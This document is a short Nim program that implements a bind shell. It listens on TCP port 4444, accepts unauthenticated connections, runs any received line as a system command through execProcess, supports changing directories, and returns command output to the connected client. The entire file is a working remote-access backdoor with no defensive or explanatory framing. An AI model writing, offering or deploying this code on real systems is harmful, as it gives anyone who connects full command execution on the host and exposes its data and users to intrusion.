import net
import nativesockets
import osproc
import strutils
import os

var port = 4444
var run = true

var server: Socket = newSocket()
server.setSockOpt(OptReuseAddr, true)
server.getFd().setBlocking(false)
server.bindAddr(Port(port))
server.listen()
echo "Listening on ", port

var clients: seq[Socket] = @[]

while run:
    try:
        var client: Socket = new(Socket)
        server.accept(client)
        clients.add(client)
        echo "Server: Client connected"
    except OSError as e:
        discard

    var clientsToRemove: seq[int] = @[]

    for index, client in clients:
        try:
            let command: string = client.recvLine(timeout = 5)

            if command == "":
                clientsToRemove.add(index)
            elif command == "shutdown":
                run = false
            elif command.startsWith("cd"):
                let dir = command.split()[1]
                try: 
                    os.setCurrentDir(dir)
                    var result = os.getCurrentDir()
                    client.send(result & "\r\L\r\L")
                except OSError:
                    client.send("Directory doesn't exist!\r\L\r\L")
            else:
                try: 
                    var result = execProcess(command)
                    client.send(result & "\r\L")
                except OSError:
                    discard

        except TimeoutError:
            discard

    for index in clientsToRemove:
        clients.del(index)
        echo "Server: Client disconnected"

server.close()
system.quit(0)
